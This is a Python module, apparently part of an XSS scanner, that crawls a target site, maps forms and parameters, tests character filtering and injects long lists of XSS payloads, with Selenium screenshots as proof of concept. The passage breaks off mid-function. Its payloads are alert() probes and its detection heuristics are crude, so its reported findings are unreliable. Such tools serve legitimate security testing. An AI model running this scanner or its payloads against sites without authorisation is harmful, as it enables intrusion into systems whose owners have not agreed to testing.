#!/usr/bin/env python3
"""
Advanced Reconnaissance Module for XSS Scanner
Comprehensive reconnaissance with context-aware analysis and character filtering detection
"""

import re
import time
import json
import random
import string
import concurrent.futures
import threading
from typing import Dict, List, Set, Tuple, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup, Comment
import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
import base64
import urllib.parse
from live_progress import live_progress

class AdvancedReconnaissance:
    """Advanced reconnaissance engine with comprehensive analysis"""
    
    def __init__(self, target_url: str, options: Dict):
        self.target_url = target_url
        self.options = options
        self.session = requests.Session()
        self.discovered_urls = set()
        self.input_points = []
        self.character_filters = {}
        self.context_analysis = {}
        self.vulnerability_confirmations = []
        
        # Setup session
        self._configure_session()
        
        # Character filter test payloads
        self.filter_test_payloads = [
            '<', '>', '"', "'", '&', ';', '(', ')', '{', '}', '[', ']',
            'script', 'alert', 'javascript', 'onload', 'onerror', 'onclick',
            'document', 'window', 'eval', 'function', 'var', 'let', 'const',
            'iframe', 'img', 'svg', 'object', 'embed', 'form', 'input',
            'style', 'link', 'meta', 'base', 'body', 'html', 'head',
            'onmouseover', 'onfocus', 'onblur', 'onchange', 'onsubmit',
            'onreset', 'onselect', 'onkeydown', 'onkeyup', 'onkeypress',
            'onmousedown', 'onmouseup', 'onmousemove', 'onmouseout',
            'onmouseenter', 'onmouseleave', 'oncontextmenu', 'ondblclick',
            'onwheel', 'onabort', 'oncanplay', 'oncanplaythrough',
            'ondurationchange', 'onemptied', 'onended', 'onloadeddata',
            'onloadedmetadata', 'onloadstart', 'onpause', 'onplay',
            'onplaying', 'onprogress', 'onratechange', 'onseeked',
            'onseeking', 'onstalled', 'onsuspend', 'ontimeupdate',
            'onvolumechange', 'onwaiting', 'expression', 'url(',
            'javascript:', 'vbscript:', 'data:', 'about:',
            '\\x3C', '\\x3E', '\\x22', '\\x27', '\\x26',
            '&#60;', '&#62;', '&#34;', '&#39;', '&#38;',
            '&lt;', '&gt;', '&quot;', '&apos;', '&amp;',
            '%3C', '%3E', '%22', '%27', '%26', '%20',
            '\\u003C', '\\u003E', '\\u0022', '\\u0027', '\\u0026'
        ]
        
        # Context-specific payloads
        self.context_payloads = {
            'html_content': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                '<object data="javascript:alert(\'XSS\')"></object>',
                '<embed src="javascript:alert(\'XSS\')">',
                '<form><button formaction="javascript:alert(\'XSS\')">X</button>',
                '<details open ontoggle=alert("XSS")>',
                '<marquee onstart=alert("XSS")>',
                '<video><source onerror=alert("XSS")>',
                '<audio src=x onerror=alert("XSS")>',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
                '<select onfocus=alert("XSS") autofocus>',
                '<textarea onfocus=alert("XSS") autofocus>',
                '<keygen onfocus=alert("XSS") autofocus>',
                '<frameset onload=alert("XSS")>',
                '<frame onload=alert("XSS")>',
                '<applet code="javascript:alert(\'XSS\')">',
                '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">'
            ],
            'html_attribute': [
                '" onmouseover="alert(\'XSS\')" x="',
                "' onmouseover='alert(\"XSS\")' x='",
                '" onfocus="alert(\'XSS\')" autofocus="',
                "' onfocus='alert(\"XSS\")' autofocus='",
                '" onclick="alert(\'XSS\')" x="',
                "' onclick='alert(\"XSS\")' x='",
                '" onload="alert(\'XSS\')" x="',
                "' onload='alert(\"XSS\")' x='",
                '" onerror="alert(\'XSS\')" x="',
                "' onerror='alert(\"XSS\")' x='",
                '" onblur="alert(\'XSS\')" x="',
                "' onblur='alert(\"XSS\")' x='",
                '" onchange="alert(\'XSS\')" x="',
                "' onchange='alert(\"XSS\")' x='",
                '" onsubmit="alert(\'XSS\')" x="',
                "' onsubmit='alert(\"XSS\")' x='",
                '" onreset="alert(\'XSS\')" x="',
                "' onreset='alert(\"XSS\")' x='",
                '" onselect="alert(\'XSS\')" x="',
                "' onselect='alert(\"XSS\")' x='"
            ],
            'javascript_context': [
                ';alert("XSS");',
                '";alert("XSS");//',
                "';alert('XSS');//",
                '`;alert("XSS");//',
                '${alert("XSS")}',
                'alert(String.fromCharCode(88,83,83))',
                'alert`XSS`',
                'eval("alert(\'XSS\')")',
                'Function("alert(\'XSS\')")()',
                'setTimeout("alert(\'XSS\')",0)',
                'setInterval("alert(\'XSS\')",1000)',
                'document.write("alert(\'XSS\')")',
                'innerHTML="<script>alert(\'XSS\')</script>"',
                'outerHTML="<script>alert(\'XSS\')</script>"',
                'location="javascript:alert(\'XSS\')"',
                'location.href="javascript:alert(\'XSS\')"',
                'location.replace("javascript:alert(\'XSS\')")',
                'location.assign("javascript:alert(\'XSS\')")',
                'window.open("javascript:alert(\'XSS\')")',
                'history.pushState("","","javascript:alert(\'XSS\')")'
            ],
            'css_context': [
                'expression(alert("XSS"))',
                'url("javascript:alert(\'XSS\')")',
                'url(javascript:alert("XSS"))',
                'expression(alert(String.fromCharCode(88,83,83)))',
                'expression(eval("alert(\'XSS\')"))',
                'expression(Function("alert(\'XSS\')")())',
                'expression(setTimeout("alert(\'XSS\')",0))',
                'expression(setInterval("alert(\'XSS\')",1000))',
                'expression(document.write("alert(\'XSS\')"))',
                'expression(innerHTML="<script>alert(\'XSS\')</script>")',
                'expression(outerHTML="<script>alert(\'XSS\')</script>")',
                'expression(location="javascript:alert(\'XSS\')")',
                'expression(location.href="javascript:alert(\'XSS\')")',
                'expression(location.replace("javascript:alert(\'XSS\')"))',
                'expression(location.assign("javascript:alert(\'XSS\')"))',
                'expression(window.open("javascript:alert(\'XSS\')"))',
                'expression(history.pushState("","","javascript:alert(\'XSS\')"))',
                'expression(history.replaceState("","","javascript:alert(\'XSS\')"))',
                'expression(history.go("javascript:alert(\'XSS\')"))',
                'expression(history.back("javascript:alert(\'XSS\')"))'
            ],
            'url_context': [
                'javascript:alert("XSS")',
                'data:text/html,<script>alert("XSS")</script>',
                'vbscript:alert("XSS")',
                'javascript:alert(String.fromCharCode(88,83,83))',
                'javascript:eval("alert(\'XSS\')")',
                'javascript:Function("alert(\'XSS\')")()',
                'javascript:setTimeout("alert(\'XSS\')",0)',
                'javascript:setInterval("alert(\'XSS\')",1000)',
                'javascript:document.write("alert(\'XSS\')")',
                'javascript:innerHTML="<script>alert(\'XSS\')</script>"',
                'javascript:outerHTML="<script>alert(\'XSS\')</script>"',
                'javascript:location="javascript:alert(\'XSS\')"',
                'javascript:location.href="javascript:alert(\'XSS\')"',
                'javascript:location.replace("javascript:alert(\'XSS\')")',
                'javascript:location.assign("javascript:alert(\'XSS\')")',
                'javascript:window.open("javascript:alert(\'XSS\')")',
                'javascript:history.pushState("","","javascript:alert(\'XSS\')")',
                'javascript:history.replaceState("","","javascript:alert(\'XSS\')")',
                'javascript:history.go("javascript:alert(\'XSS\')")',
                'javascript:history.back("javascript:alert(\'XSS\')")'
            ]
        }
        
    def _configure_session(self):
        """Configure HTTP session"""
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
    def comprehensive_reconnaissance(self) -> Dict:
        """Perform comprehensive reconnaissance"""
        live_progress.start_phase("Advanced Reconnaissance", "Comprehensive reconnaissance with live progress tracking")
        
        # Phase 1: URL Discovery
        live_progress.start_phase("Advanced URL Discovery", "Discovering all accessible URLs and endpoints")
        self._advanced_url_discovery()
        
        # Phase 2: Input Point Discovery
        live_progress.start_phase("Comprehensive Input Point Discovery", "Finding all user input points")
        self._comprehensive_input_discovery()
        
        # Phase 3: Character Filter Analysis
        live_progress.start_phase("Character Filter Analysis", "Analyzing character filtering mechanisms")
        self._analyze_character_filters()
        
        # Phase 4: Context Analysis
        live_progress.start_phase("Context Analysis", "Analyzing injection contexts")
        self._perform_context_analysis()
        
        # Phase 5: Vulnerability Testing
        live_progress.start_phase("Context-Aware Vulnerability Testing", "Testing XSS vulnerabilities with live Chrome demonstration")
        self._context_aware_vulnerability_testing()
        
        return {
            'discovered_urls': list(self.discovered_urls),
            'input_points': self.input_points,
            'character_filters': self.character_filters,
            'context_analysis': self.context_analysis,
            'vulnerability_confirmations': self.vulnerability_confirmations
        }
        
    def _advanced_url_discovery(self):
        """Advanced URL discovery with multiple techniques and live progress"""
        to_crawl = {self.target_url}
        crawled = set()
        max_depth = self.options.get('depth', 3)
        max_urls = self.options.get('max_urls', 100)
        
        # Common paths to check
        common_paths = [
            '/admin', '/login', '/register', '/search', '/contact', '/about',
            '/api', '/v1', '/v2', '/test', '/dev', '/staging', '/beta',
            '/user', '/profile', '/dashboard', '/settings', '/config',
            '/upload', '/download', '/files', '/images', '/css', '/js',
            '/robots.txt', '/sitemap.xml', '/.well-known', '/security.txt'
        ]
        
        # Add common paths to crawl list
        for path in common_paths:
            full_url = urljoin(self.target_url, path)
            to_crawl.add(full_url)
            
        live_progress.update_task(f"Starting URL discovery with {len(to_crawl)} initial URLs...")
        
        while to_crawl and len(crawled) < max_urls:
            current_url = to_crawl.pop()
            if current_url in crawled:
                continue
                
            # Show live progress
            live_progress.show_url_discovery(current_url, "crawling")
            live_progress.show_progress(len(crawled), max_urls, f"Discovered: {len(self.discovered_urls)} URLs")
                
            try:
                response = self.session.get(current_url, timeout=10)
                crawled.add(current_url)
                self.discovered_urls.add(current_url)
                
                # Show successful discovery
                live_progress.show_url_discovery(current_url, "discovered")
                
                if response.status_code == 200:
                    # Parse HTML and find links
                    # Handle encoding issues
                    try:
                        soup = BeautifulSoup(response.content, 'html.parser')
                    except Exception as e:
                        # Try with different encoding
                        try:
                            soup = BeautifulSoup(response.content.decode('utf-8', errors='ignore'), 'html.parser')
                        except:
                            soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all links
                    links_found = 0
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        full_url = urljoin(current_url, href)
                        parsed = urlparse(full_url)
                        
                        if parsed.netloc == urlparse(self.target_url).netloc:
                            if full_url not in crawled and len(crawled) < max_urls:
                                to_crawl.add(full_url)
                                links_found += 1
                                
                    # Find forms
                    forms_found = 0
                    for form in soup.find_all('form'):
                        action = form.get('action', current_url)
                        form_url = urljoin(current_url, action)
                        if form_url not in crawled:
                            to_crawl.add(form_url)
                            forms_found += 1
                            
                    # Show detailed progress
                    if links_found > 0 or forms_found > 0:
                        live_progress.show_info(f"Found {links_found} links and {forms_found} forms on {current_url}")
                            
            except Exception as e:
                live_progress.show_url_discovery(current_url, "error")
                continue
                
        live_progress.show_phase_complete("URL Discovery", {
            'discovered_urls': len(self.discovered_urls),
            'crawled_urls': len(crawled)
        })
        
    def _comprehensive_input_discovery(self):
        """Comprehensive input point discovery with live progress"""
        live_progress.update_task(f"Analyzing {len(self.discovered_urls)} URLs for input points...")
        
        for i, url in enumerate(self.discovered_urls):
            live_progress.show_progress(i, len(self.discovered_urls), f"Analyzing: {url}")
            live_progress.update_task(f"Analyzing URL {i+1}/{len(self.discovered_urls)}: {url}")
            
            try:
                response = self.session.get(url, timeout=10)
                if response.status_code != 200:
                    continue
                    
                # Handle encoding issues
                try:
                    soup = BeautifulSoup(response.content, 'html.parser')
                except Exception as e:
                    # Try with different encoding
                    try:
                        soup = BeautifulSoup(response.content.decode('utf-8', errors='ignore'), 'html.parser')
                    except:
                        soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find forms
                forms_found = 0
                for form in soup.find_all('form'):
                    form_data = {
                        'type': 'form',
                        'url': url,
                        'action': form.get('action', url),
                        'method': form.get('method', 'GET').upper(),
                        'inputs': [],
                        'form_id': form.get('id', ''),
                        'form_class': form.get('class', []),
                        'form_name': form.get('name', '')
                    }
                    
                    for input_tag in form.find_all(['input', 'textarea', 'select']):
                        input_data = {
                            'name': input_tag.get('name', ''),
                            'type': input_tag.get('type', 'text'),
                            'value': input_tag.get('value', ''),
                            'tag': input_tag.name,
                            'id': input_tag.get('id', ''),
                            'class': input_tag.get('class', []),
                            'placeholder': input_tag.get('placeholder', ''),
                            'required': input_tag.has_attr('required'),
                            'pattern': input_tag.get('pattern', ''),
                            'maxlength': input_tag.get('maxlength', ''),
                            'minlength': input_tag.get('minlength', '')
                        }
                        form_data['inputs'].append(input_data)
                        
                    if form_data['inputs']:
                        self.input_points.append(form_data)
                        forms_found += 1
                        live_progress.show_input_point(form_data)
                        
                # Find URL parameters
                parsed_url = urlparse(url)
                if parsed_url.query:
                    params = {}
                    for param in parsed_url.query.split('&'):
                        if '=' in param:
                            key, value = param.split('=', 1)
                            params[key] = value
                            
                    if params:
                        url_params_data = {
                            'type': 'url_params',
                            'url': url,
                            'params': params
                        }
                        self.input_points.append(url_params_data)
                        live_progress.show_input_point(url_params_data)
                        
                # Find JavaScript variables
                scripts = soup.find_all('script')
                js_vars_found = 0
                for script in scripts:
                    if script.string:
                        js_vars = self._extract_js_variables(script.string)
                        if js_vars:
                            js_vars_data = {
                                'type': 'javascript_variables',
                                'url': url,
                                'variables': js_vars
                            }
                            self.input_points.append(js_vars_data)
                            js_vars_found += 1
                            live_progress.show_input_point(js_vars_data)
                            
                # Show summary for this URL
                if forms_found > 0 or js_vars_found > 0 or parsed_url.query:
                    live_progress.show_info(f"Found {forms_found} forms, {js_vars_found} JS vars, {len(params) if parsed_url.query else 0} URL params on {url}")
                            
            except Exception as e:
                live_progress.show_warning(f"Error analyzing {url}: {e}")
                continue
                
        live_progress.show_phase_complete("Input Point Discovery", {
            'input_points': len(self.input_points),
            'forms': len([p for p in self.input_points if p['type'] == 'form']),
            'url_params': len([p for p in self.input_points if p['type'] == 'url_params']),
            'js_variables': len([p for p in self.input_points if p['type'] == 'javascript_variables'])
        })
        
    def _extract_js_variables(self, js_code: str) -> List[Dict]:
        """Extract JavaScript variables that might be user-controlled"""
        variables = []
        
        # Common patterns for user input in JavaScript
        patterns = [
            r'var\s+(\w+)\s*=\s*["\']([^"\']*)["\']',
            r'let\s+(\w+)\s*=\s*["\']([^"\']*)["\']',
            r'const\s+(\w+)\s*=\s*["\']([^"\']*)["\']',
            r'(\w+)\s*=\s*["\']([^"\']*)["\']',
            r'window\.(\w+)\s*=\s*["\']([^"\']*)["\']',
            r'document\.(\w+)\s*=\s*["\']([^"\']*)["\']'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, js_code, re.IGNORECASE)
            for match in matches:
                variables.append({
                    'name': match[0],
                    'value': match[1],
                    'type': 'javascript_variable'
                })
                
        return variables
        
    def _analyze_character_filters(self):
        """Analyze character filtering on input points with parallel processing"""
        live_progress.update_task("Testing character filters on input points with parallel processing...")
        
        # Filter input points that can be tested
        testable_inputs = [p for p in self.input_points if p['type'] in ['form', 'url_params']]
        total_inputs = len(testable_inputs)
        
        if total_inputs == 0:
            live_progress.show_warning("No testable input points found for character filter analysis")
            return
            
        live_progress.update_task(f"Testing {total_inputs} input points in parallel...")
        
        # Use ThreadPoolExecutor for parallel processing
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            # Submit all tasks
            future_to_input = {}
            for input_point in testable_inputs:
                if input_point['type'] == 'form':
                    future = executor.submit(self._test_form_character_filters, input_point)
                elif input_point['type'] == 'url_params':
                    future = executor.submit(self._test_url_character_filters, input_point)
                future_to_input[future] = input_point
            
            # Process completed tasks
            completed = 0
            for future in concurrent.futures.as_completed(future_to_input):
                input_point = future_to_input[future]
                completed += 1
                
                try:
                    result = future.result()
                    live_progress.update_task(f"Completed filter test {completed}/{total_inputs}: {input_point['url']}")
                    live_progress.show_progress(completed, total_inputs, "Character filter testing")
                except Exception as e:
                    live_progress.show_warning(f"Filter test failed for {input_point['url']}: {e}")
                
        live_progress.show_phase_complete("Character Filter Analysis", {
            'tested_inputs': completed,
            'filtered_chars': len(self.character_filters)
        })
                
    def _test_form_character_filters(self, form: Dict):
        """Test character filters on form inputs with optimized testing"""
        form_url = form['action']
        if not form_url.startswith(('http://', 'https://')):
            form_url = urljoin(form['url'], form_url)
            
        # Test only the first input field to save time
        testable_inputs = [field for field in form['inputs'] if field['name'] and field['type'] in ['text', 'email', 'search', 'url', 'textarea']]
        
        if not testable_inputs:
            return
            
        # Test only the first input field
        input_field = testable_inputs[0]
        field_name = input_field['name']
        
        # Test only a subset of dangerous characters for speed
        test_chars = ['<', '>', '"', "'", '&', ';', '(', ')', 'script', 'alert', 'javascript']
        filtered_chars = []
        allowed_chars = []
        
        # Test each character
        for char in test_chars:
            form_data = {}
            for field in form['inputs']:
                if field['name']:
                    if field['name'] == field_name:
                        form_data[field['name']] = char
                    else:
                        form_data[field['name']] = field.get('value', '')
                        
            try:
                if form['method'] == 'POST':
                    response = self.session.post(form_url, data=form_data, timeout=3)
                else:
                    response = self.session.get(form_url, params=form_data, timeout=3)
                    
                # Check if character was filtered
                if char not in response.text:
                    filtered_chars.append(char)
                else:
                    allowed_chars.append(char)
                    
            except Exception:
                continue
                
        if filtered_chars or allowed_chars:
            self.character_filters[f"{form['url']}#{field_name}"] = {
                'filtered_chars': filtered_chars,
                'allowed_chars': allowed_chars,
                'input_type': input_field['type']
            }
                
    def _test_url_character_filters(self, url_params: Dict):
        """Test character filters on URL parameters with optimized testing"""
        # Test only the first parameter to save time
        param_names = list(url_params['params'].keys())
        if not param_names:
            return
            
        param_name = param_names[0]
        filtered_chars = []
        allowed_chars = []
        
        # Test only a subset of dangerous characters for speed
        test_chars = ['<', '>', '"', "'", '&', ';', '(', ')', 'script', 'alert', 'javascript']
        
        # Test each character
        for char in test_chars:
            test_params = url_params['params'].copy()
            test_params[param_name] = char
            
            try:
                response = self.session.get(url_params['url'], params=test_params, timeout=3)
                
                # Check if character was filtered
                if char not in response.text:
                    filtered_chars.append(char)
                else:
                    allowed_chars.append(char)
                    
            except Exception:
                continue
                
        if filtered_chars or allowed_chars:
            self.character_filters[f"{url_params['url']}#{param_name}"] = {
                'filtered_chars': filtered_chars,
                'allowed_chars': allowed_chars,
                'input_type': 'url_parameter'
            }
                
    def _perform_context_analysis(self):
        """Perform context analysis on input points"""
        for input_point in self.input_points:
            context_info = self._analyze_input_context(input_point)
            if context_info:
                self.context_analysis[f"{input_point['url']}#{input_point.get('type', 'unknown')}"] = context_info
                
    def _analyze_input_context(self, input_point: Dict) -> Dict:
        """Analyze the context of an input point"""
        try:
            response = self.session.get(input_point['url'], timeout=10)
            if response.status_code != 200:
                return None
                
            # Handle encoding issues
            try:
                soup = BeautifulSoup(response.content, 'html.parser')
            except Exception as e:
                # Try with different encoding
                try:
                    soup = BeautifulSoup(response.content.decode('utf-8', errors='ignore'), 'html.parser')
                except:
                    soup = BeautifulSoup(response.text, 'html.parser')
            context_info = {
                'context_type': 'unknown',
                'surrounding_html': '',
                'encoding_detected': False,
                'filter_indicators': [],
                'suggested_payloads': []
            }
            
            # Analyze based on input point type
            if input_point['type'] == 'form':
                context_info = self._analyze_form_context(soup, input_point)
            elif input_point['type'] == 'url_params':
                context_info = self._analyze_url_context(soup, input_point)
            elif input_point['type'] == 'javascript_variables':
                context_info = self._analyze_js_context(soup, input_point)
                
            return context_info
            
        except Exception:
            return None
            
    def _analyze_form_context(self, soup: BeautifulSoup, form: Dict) -> Dict:
        """Analyze form context"""
        context_info = {
            'context_type': 'form',
            'surrounding_html': '',
            'encoding_detected': False,
            'filter_indicators': [],
            'suggested_payloads': []
        }
        
        # Find the form in the HTML
        form_element = None
        for f in soup.find_all('form'):
            if f.get('action') == form.get('action'):
                form_element = f
                break
                
        if form_element:
            # Extract surrounding HTML
            context_info['surrounding_html'] = str(form_element)[:500]
            
            # Analyze form attributes
            if form_element.get('enctype'):
                context_info['encoding_detected'] = True
                
            # Check for security indicators
            if 'csrf' in str(form_element).lower():
                context_info['filter_indicators'].append('csrf_protection')
                
            # Suggest payloads based on form context
            context_info['suggested_payloads'] = self.context_payloads['html_content'][:10]
            
        return context_info
        
    def _analyze_url_context(self, soup: BeautifulSoup, url_params: Dict) -> Dict:
        """Analyze URL parameter context"""
        context_info = {
            'context_type': 'url_parameter',
            'surrounding_html': '',
            'encoding_detected': False,
            'filter_indicators': [],
            'suggested_payloads': []
        }
        
        # Look for parameter reflection in HTML
        for param_name, param_value in url_params['params'].items():
            if param_value in soup.get_text():
                context_info['suggested_payloads'] = self.context_payloads['html_content'][:10]
                break
                
        return context_info
        
    def _analyze_js_context(self, soup: BeautifulSoup, js_vars: Dict) -> Dict:
        """Analyze JavaScript variable context"""
        context_info = {
            'context_type': 'javascript_variable',
            'surrounding_html': '',
            'encoding_detected': False,
            'filter_indicators': [],
            'suggested_payloads': []
        }
        
        # Look for JavaScript context
        scripts = soup.find_all('script')
        for script in scripts:
            if script.string:
                for var in js_vars['variables']:
                    if var['name'] in script.string:
                        context_info['suggested_payloads'] = self.context_payloads['javascript_context'][:10]
                        break
                        
        return context_info
        
    def _context_aware_vulnerability_testing(self):
        """Perform context-aware vulnerability testing"""
        live_progress.update_task("Starting context-aware vulnerability testing...")
        
        total_inputs = len(self.input_points)
        current = 0
        
        for input_point in self.input_points:
            context_key = f"{input_point['url']}#{input_point.get('type', 'unknown')}"
            context_info = self.context_analysis.get(context_key, {})
            
            live_progress.update_task(f"Testing: {input_point['url']} ({input_point.get('type', 'unknown')})")
            
            if context_info and context_info.get('suggested_payloads'):
                self._test_context_specific_payloads(input_point, context_info)
            else:
                # Test with basic payloads
                self._test_basic_payloads(input_point)
                
            current += 1
            live_progress.show_progress(current, total_inputs, "Vulnerability testing")
            
        live_progress.show_phase_complete("Vulnerability Testing", {
            'tested_inputs': current,
            'vulnerabilities_found': len(self.vulnerability_confirmations)
        })
                
    def _test_context_specific_payloads(self, input_point: Dict, context_info: Dict):
        """Test context-specific payloads"""
        payloads = context_info.get('suggested_payloads', [])
        
        for payload in payloads[:5]:  # Limit to 5 payloads per input point
            live_progress.show_payload_injection(payload, input_point['url'], context_info.get('context_type', ''))
            
            # Test payload
            is_vulnerable, response = self._inject_payload(input_point, payload)
            
            if is_vulnerable:
                # Show Chrome execution
                live_progress.show_chrome_execution(input_point['url'], payload)
                
                # Take screenshot for PoC
                screenshot_path = self._capture_screenshot(input_point['url'], payload)
                
                vulnerability = {
                    'url': input_point['url'],
                    'type': input_point['type'],
                    'payload': payload,
                    'context': context_info['context_type'],
                    'response_snippet': response[:1000] if response else '',
                    'screenshot_path': screenshot_path,
                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                    'confidence': 0.9
                }
                
                self.vulnerability_confirmations.append(vulnerability)
                live_progress.show_vulnerability_found(vulnerability)
                
                if screenshot_path:
                    live_progress.show_screenshot_capture(screenshot_path)
                    
    def _test_basic_payloads(self, input_point: Dict):
        """Test basic payloads when no context-specific payloads available"""
        basic_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '" onmouseover="alert(\'XSS\')" x="',
            'javascript:alert("XSS")'
        ]
        
        for payload in basic_payloads:
            live_progress.show_payload_injection(payload, input_point['url'], 'basic')
            
            # Test payload
            is_vulnerable, response = self._inject_payload(input_point, payload)
            
            if is_vulnerable:
                # Show Chrome execution
                live_progress.show_chrome_execution(input_point['url'], payload)
                
                # Take screenshot for PoC
                screenshot_path = self._capture_screenshot(input_point['url'], payload)
                
                vulnerability = {
                    'url': input_point['url'],
                    'type': input_point['type'],
                    'payload': payload,
                    'context': 'basic',
                    'response_snippet': response[:1000] if response else '',
                    'screenshot_path': screenshot_path,
                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                    'confidence': 0.8
                }
                
                self.vulnerability_confirmations.append(vulnerability)
                live_progress.show_vulnerability_found(vulnerability)
                
                if screenshot_path:
                    live_progress.show_screenshot_capture(screenshot_path)
                
    def _inject_payload(self, input_point: Dict, payload: str) -> Tuple[bool, str]:
        """Inject payload into input point"""
        try:
            if input_point['type'] == 'form':
                return self._test_form_xss(input_point, payload)
            elif input_point['type'] == 'url_params':
                return self._test_url_xss(input_point, payload)
            elif input_point['type'] == 'javascript_variables':
                return self._test_js_xss(input_point, payload)
        except Exception:
            return False, ""
            
    def _test_form_xss(self, form: Dict, payload: str) -> Tuple[bool, str]:
        """Test XSS in form inputs"""
        form_data = {}
        
        for input_field in form['inputs']:
            if input_field['name']:
                if input_field['type'] in ['text', 'email', 'search', 'url', 'textarea']:
                    form_data[input_field['name']] = payload
                else:
                    form_data[input_field['name']] = input_field.get('value', '')
        
        if not form_data:
            return False, ""
            
        try:
            form_url = form['action']
            if not form_url.startswith(('http://', 'https://')):
                form_url = urljoin(form['url'], form_url)
                
            if form['method'] == 'POST':
                response = self.session.post(form_url, data=form_data)
            else:
                response = self.session.get(form_url, params=form_data)
                
            return self._check_xss_response(response, payload)
            
        except Exception:
            return False, ""
            
    def _test_url_xss(self, url_params: Dict, payload: str) -> Tuple[bool, str]:
        """Test XSS in URL parameters"""
        test_params = url_params['params'].copy()
        
        # Test each parameter
        for param_name in test_params.keys():
            test_params[param_name] = payload
            
            try:
                response = self.session.get(url_params['url'], params=test_params)
                is_vulnerable, response_text = self._check_xss_response(response, payload)
                
                if is_vulnerable:
                    return True, f"Parameter: {param_name}\nResponse: {response_text[:500]}"
                    
            except Exception:
                continue
                
            # Reset parameter
            test_params[param_name] = url_params['params'][param_name]
            
        return False, ""
        
    def _test_js_xss(self, js_vars: Dict, payload: str) -> Tuple[bool, str]:
        """Test XSS in JavaScript variables"""
        # This would require more complex analysis
        # For now, return False
        return False, ""
        
    def _check_xss_response(self, response, payload: str) -> Tuple[bool, str]:
        """Check if response contains XSS vulnerability indicators"""
        if response.status_code != 200:
            return False, ""
            
        response_text = response.text.lower()
        payload_lower = payload.lower()
        
        # Check for direct payload reflection
        if payload_lower in response_text:
            return True, response.text
            
        # Check for common XSS indicators
        xss_indicators = [
            '<script', 'javascript:', 'vbscript:', 'data:text/html', 'expression(',
            'onload=', 'onerror=', 'onclick=', 'onmouseover=', 'onfocus=', 'onblur=',
            'onchange=', 'onsubmit=', 'onreset=', 'onselect=', 'onkeydown=', 'onkeyup=',
            'onkeypress=', 'onmousedown=', 'onmouseup=', 'onmousemove=', 'onmouseout=',
            'onmouseenter=', 'onmouseleave=', 'oncontextmenu=', 'ondblclick=', 'onwheel=',
            'onabort=', 'oncanplay=', 'oncanplaythrough=', 'ondurationchange=', 'onemptied=',
            'onended=', 'onloadeddata=', 'onloadedmetadata=', 'onloadstart=', 'onpause=',
            'onplay=', 'onplaying=', 'onprogress=', 'onratechange=', 'onseeked=',
            'onseeking=', 'onstalled=', 'onsuspend=', 'ontimeupdate=', 'onvolumechange=',
            'onwaiting=', 'formaction=', 'oninput=', 'oninvalid=', 'onformchange=',
            'onforminput=', 'onhashchange=', 'onmessage=', 'onoffline=', 'ononline=',
            'onpagehide=', 'onpageshow=', 'onpopstate=', 'onresize=', 'onstorage=',
            'onunload=', 'onbeforeunload=', 'onbeforeprint=', 'onafterprint='
        ]
        
        for indicator in xss_indicators:
            if indicator in response_text:
                return True, response.text
                
        return False, ""
        
    def _capture_screenshot(self, url: str, payload: str) -> str:
        """Capture screenshot for PoC with live Chrome demonstration"""
        try:
            # Setup Chrome options for visible browser
            chrome_options = Options()
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--start-maximized')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--disable-features=VizDisplayCompositor')
            chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36')
            
            # Initialize WebDriver
            driver = webdriver.Chrome(options=chrome_options)
            
            # Navigate to URL
            driver.get(url)
            
            # Wait for page to load
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            # Take initial screenshot
            timestamp = int(time.time())
            initial_screenshot = f"poc_screenshots/initial_{timestamp}.png"
            driver.save_screenshot(initial_screenshot)
            
            # Inject payload and take screenshot
            try:
                # Try to inject payload into forms
                forms = driver.find_elements(By.TAG_NAME, "form")
                for form in forms:
                    inputs = form.find_elements(By.CSS_SELECTOR, "input[type='text'], input[type='email'], input[type='search'], textarea")
                    for input_field in inputs:
                        input_field.clear()
                        input_field.send_keys(payload)
                        
                # Submit forms
                submit_buttons = driver.find_elements(By.CSS_SELECTOR, "input[type='submit'], button[type='submit']")
                for button in submit_buttons:
                    button.click()
                    time.sleep(2)
                    
                    # Check for alert
                    try:
                        WebDriverWait(driver, 3).until(EC.alert_is_present())
                        alert = driver.switch_to.alert
                        live_progress.show_alert_detected()
                        alert.accept()
                    except TimeoutException:
                        pass
                        
            except Exception as e:
                live_progress.show_warning(f"Payload injection failed: {e}")
            
            # Take final screenshot
            final_screenshot = f"poc_screenshots/final_{timestamp}.png"
            driver.save_screenshot(final_screenshot)
            
            # Close driver
            driver.quit()
            
            return final_screenshot
            
        except Exception as e:
            live_progress.show_error(f"Screenshot capture failed: {e}")
            return ""
            
    def generate_advanced_report(self) -> Dict:
        """Generate advanced reconnaissance report"""
        return {
            'target_url': self.target_url,
            'scan_timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
